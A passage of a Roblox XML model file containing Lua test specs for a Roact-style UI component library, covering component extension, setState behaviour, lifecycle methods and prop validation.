		MyComponent.didMount = didMountSpy.value

		function MyComponent:render()
			return nil
		end

		local element = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(didMountSpy.callCount).to.equal(1)

		local values = didMountSpy:captureValues("self")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX2C46EA0A8FAB402E96C4DFA36F7FFD0E">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">extend.spec</string>
						<string name="ScriptGuid">{01988CBF-2BAC-4E1E-9B2A-E96D26ECEBF1}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	it("should be extendable", function()
		local MyComponent = Component:extend("The Senate")

		expect(MyComponent).to.be.ok()
		expect(Type.of(MyComponent)).to.equal(Type.StatefulComponentClass)
	end)

	it("should prevent extending a user component", function()
		local MyComponent = Component:extend("Sheev")

		expect(function()
			MyComponent:extend("Frank")
		end).to.throw()
	end)

	it("should use a given name", function()
		local MyComponent = Component:extend("FooBar")

		local name = tostring(MyComponent)

		expect(name).to.be.a("string")
		expect(name:find("FooBar")).to.be.ok()
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX254BBC6573BF4B75917B737DC23E1751">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">getElementTraceback.spec</string>
						<string name="ScriptGuid">{9C7D5D07-6E48-42CD-B8E6-712591BC3FCC}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local GlobalConfig = require(script.Parent.Parent.GlobalConfig)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should return stack traces in initial renders", function()
		local TestComponent = Component:extend("TestComponent")

		local stackTrace
		function TestComponent:init()
			stackTrace = self:getElementTraceback()
		end

		function TestComponent:render()
			return nil
		end

		local config = {
			elementTracing = true,
		}

		GlobalConfig.scoped(config, function()
			local element = createElement(TestComponent)
			local hostParent = nil
			local key = "Some key"

			noopReconciler.mountVirtualNode(element, hostParent, key)
		end)

		expect(stackTrace).to.be.a("string")
	end)

	itSKIP("it should return an updated stack trace after an update", function() end)

	it("should return nil when elementTracing is off", function()
		local stackTrace = nil

		local config = {
			elementTracing = false,
		}

		local TestComponent = Component:extend("TestComponent")

		function TestComponent:init()
			stackTrace = self:getElementTraceback()
		end

		function TestComponent:render()
			return nil
		end

		GlobalConfig.scoped(config, function()
			local element = createElement(TestComponent)
			local hostParent = nil
			local key = "Some key"

			noopReconciler.mountVirtualNode(element, hostParent, key)
		end)

		expect(stackTrace).to.equal(nil)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBXD072B376D1954210B780BC58580F725F">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">setState.spec</string>
						<string name="ScriptGuid">{7BB6D666-EEA1-4CFC-92FD-DBB2277BCE4B}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local None = require(script.Parent.Parent.None)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	describe("setState", function()
		it("should not trigger an extra update when called in init", function()
			local renderCount = 0
			local updateCount = 0
			local capturedState

			local InitComponent = Component:extend("InitComponent")

			function InitComponent:init()
				self:setState({
					a = 1
				})
			end

			function InitComponent:willUpdate()
				updateCount = updateCount + 1
			end

			function InitComponent:render()
				renderCount = renderCount + 1
				capturedState = self.state
				return nil
			end

			local initElement = createElement(InitComponent)

			noopReconciler.mountVirtualTree(initElement)

			expect(renderCount).to.equal(1)
			expect(updateCount).to.equal(0)
			expect(capturedState.a).to.equal(1)
		end)

		it("should throw when called in render", function()
			local TestComponent = Component:extend("TestComponent")

			function TestComponent:render()
				self:setState({
					a = 1
				})
			end

			local renderElement = createElement(TestComponent)

			local success, result = pcall(noopReconciler.mountVirtualTree, renderElement)

			expect(success).to.equal(false)
			expect(result:match("render")).to.be.ok()
			expect(result:match("TestComponent")).to.be.ok()
		end)

		it("should throw when called in shouldUpdate", function()
			local TestComponent = Component:extend("TestComponent")

			function TestComponent:render()
				return nil
			end

			function TestComponent:shouldUpdate()
				self:setState({
					a = 1
				})
			end

			local initialElement = createElement(TestComponent)
			local updatedElement = createElement(TestComponent)

			local tree = noopReconciler.mountVirtualTree(initialElement)

			local success, result = pcall(noopReconciler.updateVirtualTree, tree, updatedElement)

			expect(success).to.equal(false)
			expect(result:match("shouldUpdate")).to.be.ok()
			expect(result:match("TestComponent")).to.be.ok()
		end)

		it("should throw when called in willUpdate", function()
			local TestComponent = Component:extend("TestComponent")

			function TestComponent:render()
				return nil
			end

			function TestComponent:willUpdate()
				self:setState({
					a = 1
				})
			end

			local initialElement = createElement(TestComponent)
			local updatedElement = createElement(TestComponent)
			local tree = noopReconciler.mountVirtualTree(initialElement)

			local success, result = pcall(noopReconciler.updateVirtualTree, tree, updatedElement)

			expect(success).to.equal(false)
			expect(result:match("willUpdate")).to.be.ok()
			expect(result:match("TestComponent")).to.be.ok()
		end)

		it("should throw when called in willUnmount", function()
			local TestComponent = Component:extend("TestComponent")

			function TestComponent:render()
				return nil
			end

			function TestComponent:willUnmount()
				self:setState({
					a = 1
				})
			end

			local element = createElement(TestComponent)
			local tree = noopReconciler.mountVirtualTree(element)

			local success, result = pcall(noopReconciler.unmountVirtualTree, tree)

			expect(success).to.equal(false)
			expect(result:match("willUnmount")).to.be.ok()
			expect(result:match("TestComponent")).to.be.ok()
		end)

		it("should remove values from state when the value is None", function()
			local TestComponent = Component:extend("TestComponent")
			local setStateCallback, getStateCallback

			function TestComponent:init()
				setStateCallback = function(newState)
					self:setState(newState)
				end

				getStateCallback = function()
					return self.state
				end

				self:setState({
					value = 0
				})
			end

			function TestComponent:render()
				return nil
			end

			local element = createElement(TestComponent)
			local instance = noopReconciler.mountVirtualNode(element, nil, "Test")

			expect(getStateCallback().value).to.equal(0)

			setStateCallback({
				value = None
			})

			expect(getStateCallback().value).to.equal(nil)

			noopReconciler.unmountVirtualNode(instance)
		end)

		it("should invoke functions to compute a partial state", function()
			local TestComponent = Component:extend("TestComponent")
			local setStateCallback, getStateCallback, getPropsCallback

			function TestComponent:init()
				setStateCallback = function(newState)
					self:setState(newState)
				end

				getStateCallback = function()
					return self.state
				end

				getPropsCallback = function()
					return self.props
				end

				self:setState({
					value = 0
				})
			end

			function TestComponent:render()
				return nil
			end

			local element = createElement(TestComponent)
			local instance = noopReconciler.mountVirtualNode(element, nil, "Test")

			expect(getStateCallback().value).to.equal(0)

			setStateCallback(function(state, props)
				expect(state).to.equal(getStateCallback())
				expect(props).to.equal(getPropsCallback())

				return {
					value = state.value + 1
				}
			end)

			expect(getStateCallback().value).to.equal(1)

			noopReconciler.unmountVirtualNode(instance)
		end)

		it("should cancel rendering if the function returns nil", function()
			local TestComponent = Component:extend("TestComponent")
			local setStateCallback
			local renderCount = 0

			function TestComponent:init()
				setStateCallback = function(newState)
					self:setState(newState)
				end

				self:setState({
					value = 0
				})
			end

			function TestComponent:render()
				renderCount = renderCount + 1
				return nil
			end

			local element = createElement(TestComponent)
			local instance = noopReconciler.mountVirtualNode(element, nil, "Test")
			expect(renderCount).to.equal(1)

			setStateCallback(function(state, props)
				return nil
			end)

			expect(renderCount).to.equal(1)

			noopReconciler.unmountVirtualNode(instance)
		end)
	end)

	describe("setState suspension", function()
		it("should defer setState triggered while reconciling", function()
			local Child = Component:extend("Child")
			local getParentStateCallback

			function Child:render()
				return nil
			end

			function Child:didMount()
				self.props.callback()
			end

			local Parent = Component:extend("Parent")

			function Parent:init()
				getParentStateCallback = function()
					return self.state
				end
			end

			function Parent:render()
				return createElement(Child, {
					callback = function()
						self:setState({
							foo = "bar"
						})
					end,
				})
			end

			local element = createElement(Parent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
			expect(getParentStateCallback().foo).to.equal("bar")
		end)

		it("should defer setState triggered while reconciling during an update", function()
			local Child = Component:extend("Child")
			local getParentStateCallback

			function Child:render()
				return nil
			end

			function Child:didUpdate()
				self.props.callback()
			end

			local Parent = Component:extend("Parent")

			function Parent:init()
				getParentStateCallback = function()
					return self.state
				end
			end

			function Parent:render()
				return createElement(Child, {
					callback = function()
						-- This guards against a stack overflow that would be OUR fault
						if not self.state.foo then
							self:setState({
								foo = "bar"
							})
						end
					end,
				})
			end

			local element = createElement(Parent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
			expect(getParentStateCallback().foo).to.equal(nil)

			result = noopReconciler.updateVirtualNode(result, createElement(Parent))

			expect(result).to.be.ok()
			expect(getParentStateCallback().foo).to.equal("bar")

			noopReconciler.unmountVirtualNode(result)
		end)

		it("should combine pending state changes properly", function()
			local Child = Component:extend("Child")
			local getParentStateCallback

			function Child:render()
				return nil
			end

			function Child:didMount()
				self.props.callback("foo", 1)
				self.props.callback("bar", 3)
			end

			local Parent = Component:extend("Parent")

			function Parent:init()
				getParentStateCallback = function()
					return self.state
				end
			end

			function Parent:render()
				return createElement(Child, {
					callback = function(key, value)
						self:setState({
							[key] = value,
						})
					end,
				})
			end

			local element = createElement(Parent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
			expect(getParentStateCallback().foo).to.equal(1)
			expect(getParentStateCallback().bar).to.equal(3)

			noopReconciler.unmountVirtualNode(result)
		end)

		it("should abort properly when functional setState returns nil while deferred", function()
			local Child = Component:extend("Child")

			function Child:render()
				return nil
			end

			function Child:didMount()
				self.props.callback()
			end

			local Parent = Component:extend("Parent")

			local renderSpy = createSpy(function(self)
				return createElement(Child, {
					callback = function()
						self:setState(function()
							-- abort the setState
							return nil
						end)
					end,
				})
			end)

			Parent.render = renderSpy.value

			local element = createElement(Parent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
			expect(renderSpy.callCount).to.equal(1)

			noopReconciler.unmountVirtualNode(result)
		end)

		it("should still apply pending state if a subsequent state update was aborted", function()
			local Child = Component:extend("Child")
			local getParentStateCallback

			function Child:render()
				return nil
			end

			function Child:didMount()
				self.props.callback(function()
					return {
						foo = 1,
					}
				end)
				self.props.callback(function()
					return nil
				end)
			end

			local Parent = Component:extend("Parent")

			function Parent:init()
				getParentStateCallback = function()
					return self.state
				end
			end

			function Parent:render()
				return createElement(Child, {
					callback = function(stateUpdater)
						self:setState(stateUpdater)
					end,
				})
			end

			local element = createElement(Parent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
			expect(getParentStateCallback().foo).to.equal(1)

			noopReconciler.unmountVirtualNode(result)
		end)

		it("should not re-process new state when pending state is present after update", function()
			local setComponentState
			local getComponentState

			local MyComponent = Component:extend("MyComponent")

			function MyComponent:init()
				self:setState({
					hasUpdatedOnce = false,
					counter = 0,
				})

				setComponentState = function(mapState)
					self:setState(mapState)
				end

				getComponentState = function()
					return self.state
				end
			end

			function MyComponent:render()
				return nil
			end

			function MyComponent:didUpdate()
				if self.state.hasUpdatedOnce == false then
					self:setState({
						hasUpdatedOnce = true,
					})
				end
			end

			local element = createElement(MyComponent)
			local hostParent = nil
			local key = "Test"

			noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(getComponentState().hasUpdatedOnce).to.equal(false)
			expect(getComponentState().counter).to.equal(0)

			setComponentState(function(state)
				return {
					counter = state.counter + 1
				}
			end)

			expect(getComponentState().hasUpdatedOnce).to.equal(true)
			expect(getComponentState().counter).to.equal(1)
		end)

		it("should throw when an infinite update is triggered", function()
			local InfiniteUpdater = Component:extend("InfiniteUpdater")

			function InfiniteUpdater:render()
				return nil
			end

			function InfiniteUpdater:didMount()
				self:setState({})
			end

			function InfiniteUpdater:didUpdate()
				self:setState({})
			end

			local element = createElement(InfiniteUpdater)
			local hostParent = nil
			local key = "Test"

			local success, result = pcall(noopReconciler.mountVirtualNode, element, hostParent, key)

			expect(success).to.equal(false)
			expect(result:find("InfiniteUpdater")).to.be.ok()
			expect(result:find("reached the setState update recursion limit")).to.be.ok()
		end)

		itSKIP("should process single updates with both new and pending state", function()
			--[[
				This situation shouldn't be possible currently, but the implementation
				should support it for future update de-duplication
			]]
		end)

		it("should call trigger update after didMount when setting state in didMount", function()
			--[[
				Before setState suspension, it was possible to call setState in didMount but it would
				not actually finish resolving didMount until after the entire update.

				This is theoretically problematic, as it means that lifecycle methods like didUpdate
				could be called before didMount is finished. setState suspension resolves this by
				suspending state updates made in didMount and didUpdate as well as reconciliation
			]]
			local MyComponent = Component:extend("MyComponent")

			function MyComponent:init()
				self:setState({
					status = "initial mount"
				})

				self.isMounted = false
			end

			function MyComponent:render()
				return nil
			end

			function MyComponent:didMount()
				self:setState({
					status = "mounted"
				})

				self.isMounted = true
			end

			function MyComponent:didUpdate(oldProps, oldState)
				expect(oldState.status).to.equal("initial mount")
				expect(self.state.status).to.equal("mounted")

				expect(self.isMounted).to.equal(true)
			end

			local element = createElement(MyComponent)
			local hostParent = nil
			local key = "Test"

			local result = noopReconciler.mountVirtualNode(element, hostParent, key)

			expect(result).to.be.ok()
		end)
	end)
end
]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX1CA7501672884C86BE2DE35A0048BAD0">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">render.spec</string>
						<string name="ScriptGuid">{D0DFADF2-B5EB-41A8-907B-72991DC8A374}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should throw on mount if not overridden", function()
		local MyComponent = Component:extend("MyComponent")

		local element = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		local success, result = pcall(function()
			noopReconciler.mountVirtualNode(element, hostParent, key)
		end)

		expect(success).to.equal(false)
		expect(result:match("MyComponent")).to.be.ok()
		expect(result:match("render")).to.be.ok()
	end)

	it("should be invoked when a component is mounted", function()
		local Foo = Component:extend("Foo")

		local capturedProps
		local capturedState
		local renderSpy = createSpy(function(self)
			capturedProps = self.props
			capturedState = self.state
		end)
		Foo.render = renderSpy.value

		local element = createElement(Foo)
		local hostParent = nil
		local key = "Foo Test"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(renderSpy.callCount).to.equal(1)

		local renderArguments = renderSpy:captureValues("self")

		expect(Type.of(renderArguments.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(capturedProps, {})
		assertDeepEqual(capturedState, {})
	end)

	it("should be invoked when a component is updated via props", function()
		local Foo = Component:extend("Foo")

		local capturedProps
		local capturedState
		local renderSpy = createSpy(function(self)
			capturedProps = self.props
			capturedState = self.state
		end)
		Foo.render = renderSpy.value

		local initialProps = {
			a = 2,
		}
		local element = createElement(Foo, initialProps)
		local hostParent = nil
		local key = "Foo Test"

		local node = noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(renderSpy.callCount).to.equal(1)

		local firstRenderArguments = renderSpy:captureValues("self")
		local firstProps = capturedProps
		local firstState = capturedState

		expect(Type.of(firstRenderArguments.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(firstProps, initialProps)
		assertDeepEqual(firstState, {})

		local updatedProps = {
			a = 3,
		}
		local newElement = createElement(Foo, updatedProps)

		noopReconciler.updateVirtualNode(node, newElement)

		expect(renderSpy.callCount).to.equal(2)

		local secondRenderArguments = renderSpy:captureValues("self")
		local secondProps = capturedProps
		local secondState = capturedState

		expect(Type.of(secondRenderArguments.self)).to.equal(Type.StatefulComponentInstance)
		expect(secondProps).never.to.equal(firstProps)
		assertDeepEqual(secondProps, updatedProps)
		expect(secondState).to.equal(firstState)
	end)

	it("should be invoked when a component is updated via state", function()
		local Foo = Component:extend("Foo")

		local setState
		function Foo:init()
			setState = function(...)
				return self:setState(...)
			end
		end

		local capturedProps
		local capturedState
		local renderSpy = createSpy(function(self)
			capturedProps = self.props
			capturedState = self.state
		end)
		Foo.render = renderSpy.value

		local element = createElement(Foo)
		local hostParent = nil
		local key = "Foo Test"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(renderSpy.callCount).to.equal(1)

		local firstRenderArguments = renderSpy:captureValues("self")
		local firstProps = capturedProps
		local firstState = capturedState

		expect(Type.of(firstRenderArguments.self)).to.equal(Type.StatefulComponentInstance)

		setState({})

		expect(renderSpy.callCount).to.equal(2)

		local renderArguments = renderSpy:captureValues("self")

		expect(Type.of(renderArguments.self)).to.equal(Type.StatefulComponentInstance)
		expect(capturedProps).to.equal(firstProps)
		expect(capturedState).never.to.equal(firstState)
	end)

	itSKIP("Test defaultProps on initial render", function() end)
	itSKIP("Test defaultProps on prop update", function() end)
	itSKIP("Test defaultProps on state update", function() end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX768DBCBAFE69431DBA0D338851F998AF">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">willUpdate.spec</string>
						<string name="ScriptGuid">{0C42067B-C166-479C-AAFE-CB0FE2E406E2}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when updated via updateVirtualNode", function()
		local MyComponent = Component:extend("MyComponent")

		local willUpdateSpy = createSpy()

		MyComponent.willUpdate = willUpdateSpy.value

		function MyComponent:render()
			return nil
		end

		local initialProps = {
			a = 5,
		}
		local initialElement = createElement(MyComponent, initialProps)
		local hostParent = nil
		local key = "Test"

		local node = noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		local newProps = {
			a = 6,
			b = 2,
		}
		local newElement = createElement(MyComponent, newProps)
		noopReconciler.updateVirtualNode(node, newElement)

		expect(willUpdateSpy.callCount).to.equal(1)

		local values = willUpdateSpy:captureValues("self", "newProps", "newState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(values.newProps, newProps)
		assertDeepEqual(values.newState, {})
	end)

	it("it should be invoked when updated via setState", function()
		local MyComponent = Component:extend("MyComponent")
		local setComponentState

		local willUpdateSpy = createSpy()

		MyComponent.willUpdate = willUpdateSpy.value

		function MyComponent:init()
			setComponentState = function(state)
				self:setState(state)
			end

			self:setState({
				foo = 1
			})
		end

		function MyComponent:render()
			return nil
		end

		local initialElement = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(willUpdateSpy.callCount).to.equal(0)

		setComponentState({
			foo = 2
		})

		expect(willUpdateSpy.callCount).to.equal(1)

		local values = willUpdateSpy:captureValues("self", "newProps", "newState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(values.newProps, {})
		assertDeepEqual(values.newState, {
			foo = 2
		})
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX5B3C1D7FB12B4CBFBD6D89776A25AB86">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">willUnmount.spec</string>
						<string name="ScriptGuid">{99F69BC7-741E-4A72-B418-D9AFBBED90F1}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when unmounted", function()
		local MyComponent = Component:extend("MyComponent")

		local willUnmountSpy = createSpy()

		MyComponent.willUnmount = willUnmountSpy.value

		function MyComponent:render()
			return nil
		end

		local element = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		local node = noopReconciler.mountVirtualNode(element, hostParent, key)
		noopReconciler.unmountVirtualNode(node)

		expect(willUnmountSpy.callCount).to.equal(1)

		local values = willUnmountSpy:captureValues("self")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBXD1E517913616440BB62C12755CA4F88E">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">validateProps.spec</string>
						<string name="ScriptGuid">{A3F0BC69-F60D-40EF-A51B-87586792E367}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local GlobalConfig = require(script.Parent.Parent.GlobalConfig)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when mounted", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")

			local validatePropsSpy = createSpy(function()
				return true
			end)

			MyComponent.validateProps = validatePropsSpy.value

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent)
			local hostParent = nil
			local key = "Test"

			noopReconciler.mountVirtualNode(element, hostParent, key)
			expect(validatePropsSpy.callCount).to.equal(1)
		end)
	end)

	it("should be invoked when props change", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")

			local validatePropsSpy = createSpy(function()
				return true
			end)

			MyComponent.validateProps = validatePropsSpy.value

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent, { a = 1 })
			local hostParent = nil
			local key = "Test"

			local node = noopReconciler.mountVirtualNode(element, hostParent, key)
			expect(validatePropsSpy.callCount).to.equal(1)
			validatePropsSpy:assertCalledWithDeepEqual({
				a = 1,
			})

			local newElement = createElement(MyComponent, { a = 2 })
			noopReconciler.updateVirtualNode(node, newElement)
			expect(validatePropsSpy.callCount).to.equal(2)
			validatePropsSpy:assertCalledWithDeepEqual({
				a = 2,
			})
		end)
	end)

	it("should not be invoked when state changes", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")

			local setStateCallback = nil
			local validatePropsSpy = createSpy(function()
				return true
			end)

			MyComponent.validateProps = validatePropsSpy.value

			function MyComponent:init()
				setStateCallback = function(newState)
					self:setState(newState)
				end
			end

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent, { a = 1 })
			local hostParent = nil
			local key = "Test"

			noopReconciler.mountVirtualNode(element, hostParent, key)
			expect(validatePropsSpy.callCount).to.equal(1)
			validatePropsSpy:assertCalledWithDeepEqual({
				a = 1
			})

			setStateCallback({
				b = 1
			})

			expect(validatePropsSpy.callCount).to.equal(1)
		end)
	end)

	it("should throw if validateProps is not a function", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")
			MyComponent.validateProps = 1

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent)
			local hostParent = nil
			local key = "Test"

			expect(function()
				noopReconciler.mountVirtualNode(element, hostParent, key)
			end).to.throw()
		end)
	end)

	it("should throw if validateProps returns false", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")
			MyComponent.validateProps = function()
				return false
			end

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent)
			local hostParent = nil
			local key = "Test"

			expect(function()
				noopReconciler.mountVirtualNode(element, hostParent, key)
			end).to.throw()
		end)
	end)

	it("should be invoked after defaultProps are applied", function()
		local config = {
			propValidation = true,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")

			local validatePropsSpy = createSpy(function()
				return true
			end)

			MyComponent.validateProps = validatePropsSpy.value

			function MyComponent:render()
				return nil
			end

			MyComponent.defaultProps = {
				b = 2,
			}

			local element = createElement(MyComponent, { a = 1 })
			local hostParent = nil
			local key = "Test"

			local node = noopReconciler.mountVirtualNode(element, hostParent, key)
			expect(validatePropsSpy.callCount).to.equal(1)
			validatePropsSpy:assertCalledWithDeepEqual({
				a = 1,
				b = 2,
			})

			local newElement = createElement(MyComponent, { a = 2 })
			noopReconciler.updateVirtualNode(node, newElement)
			expect(validatePropsSpy.callCount).to.equal(2)
			validatePropsSpy:assertCalledWithDeepEqual({
				a = 2,
				b = 2,
			})
		end)
	end)

	it("should not be invoked if the flag is off", function()
		local config = {
			propValidation = false,
		}

		GlobalConfig.scoped(config, function()
			local MyComponent = Component:extend("MyComponent")

			local validatePropsSpy = createSpy(function()
				return true
			end)

			MyComponent.validateProps = validatePropsSpy.value

			function MyComponent:render()
				return nil
			end

			local element = createElement(MyComponent, { a = 1 })
			local hostParent = nil
			local key = "Test"

			local node = noopReconciler.mountVirtualNode(element, hostParent, key)
			expect(validatePropsSpy.callCount).to.equal(0)

			local newElement = createElement(MyComponent, { a = 2 })
			noopReconciler.updateVirtualNode(node, newElement)
			expect(validatePropsSpy.callCount).to.equal(0)
		end)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBXF3CA5AF523AD4CBF9F4C24D7CC97B32E">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">didUpdate.spec</string>
						<string name="ScriptGuid">{4C5C6808-8EEB-4DE5-9A89-7D62E173E99F}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when updated via updateVirtualNode", function()
		local MyComponent = Component:extend("MyComponent")

		local didUpdateSpy = createSpy()
		MyComponent.didUpdate = didUpdateSpy.value

		function MyComponent:render()
			return nil
		end

		local initialProps = {
			a = 5,
		}
		local initialElement = createElement(MyComponent, initialProps)
		local hostParent = nil
		local key = "Test"

		local virtualNode = noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(didUpdateSpy.callCount).to.equal(0)

		local newProps = {
			a = 6,
			b = 2,
		}
		local newElement = createElement(MyComponent, newProps)
		noopReconciler.updateVirtualNode(virtualNode, newElement)

		expect(didUpdateSpy.callCount).to.equal(1)

		local values = didUpdateSpy:captureValues("self", "oldProps", "oldState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(values.oldProps, initialProps)
		assertDeepEqual(values.oldState, {})
	end)

	it("should be invoked when updated via setState", function()
		local MyComponent = Component:extend("MyComponent")

		local didUpdateSpy = createSpy()
		MyComponent.didUpdate = didUpdateSpy.value

		local initialState = {
			a = 4,
		}

		local setState
		function MyComponent:init()
			setState = function(...)
				return self:setState(...)
			end

			self:setState(initialState)
		end

		function MyComponent:render()
		end

		local element = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(didUpdateSpy.callCount).to.equal(0)

		setState({
			a = 5,
		})

		expect(didUpdateSpy.callCount).to.equal(1)

